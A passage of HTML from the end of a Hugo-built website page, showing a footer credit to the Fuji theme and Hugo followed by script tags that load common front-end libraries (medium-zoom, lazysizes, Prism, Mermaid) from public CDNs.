| Powered by <a href=https://github.com/andrew-aiken/hugo-theme-fuji/ target=_blank>Fuji</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script><script defer src=/assets/js/fuji.min.js></script><script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>